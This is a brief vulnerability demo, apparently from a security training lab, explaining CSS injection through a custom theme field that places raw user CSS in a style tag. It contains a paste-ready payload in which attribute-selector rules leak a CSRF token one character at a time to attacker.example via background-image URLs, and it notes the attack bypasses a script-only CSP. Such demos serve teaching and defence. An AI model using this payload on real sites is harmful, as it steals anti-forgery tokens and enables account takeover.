Custom CSS Theme — CSS Injection

CWE-74 · Raw CSS in <style> tag · Attribute selectors exfiltrate CSRF tokens without JS
User-supplied CSS is injected directly into a <style> tag with no sanitisation. CSS attribute selectors can target hidden form inputs by value prefix, triggering background-image: url(attacker/log?c=X) requests — exfiltrating secret values one character at a time with zero JavaScript.
Exfiltration payload (paste in CSS field): 
/* Exfiltrate CSRF token — first char 'a' */
input[name="csrf_token"][value^="a"] {
  background: url(https://attacker.example/log?c=a);
}
input[name="csrf_token"][value^="b"] {
  background: url(https://attacker.example/log?b=b);
}
/* Repeat for all possible chars to enumerate */

/* Malicious style injection — demo */
.panel { border-color: #ff3366 !important; }
Works even with CSP script-src 'none' if style-src allows inline styles.
